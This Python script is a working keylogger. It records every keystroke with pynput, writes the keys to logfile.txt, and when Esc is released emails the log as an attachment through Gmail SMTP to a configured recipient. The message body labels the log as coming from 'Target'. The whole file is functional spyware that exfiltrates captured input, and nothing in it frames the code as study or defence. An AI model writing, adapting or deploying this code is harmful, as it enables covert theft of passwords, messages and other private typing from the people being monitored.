import pynput
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener


count=0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)     #It stores all the keystrokes in a list named keys
    count+=1

    print("{0} pressed".format(key))    #Prints the keys that  are pressed

    if count >= 1:
        count=0
        write_file(keys)
        keys=[]

email_user="abc@def.com"    #Enter email ID for sending email
email_password = "password"     #Enter email ID password
email_send="xyz@def.com"    #Enter email ID of the reciever
subject = 'New Log File'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'New log file from Target'
msg.attach(MIMEText(body,'plain'))

filename="logfile.txt"

def write_file(keys):
    with open(filename, "a") as f:
        for key in keys:
            k = str(key).replace("'","")    #It helps in only registering alphabets and numbers
            if k.find("space")>0:   #Space bar moves the word to next line
                f.write('\n')
            elif k.find("Key")== -1:    #It saves the keystrokes in a constant string and not in the format
                f.write(k)
                
def on_release(key):
    if key == Key.esc:
        attachment=open(filename,'rb')
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        msg.attach(part)
        text = msg.as_string()

        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)
        server.sendmail(email_user,email_send,text)
        server.quit()
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


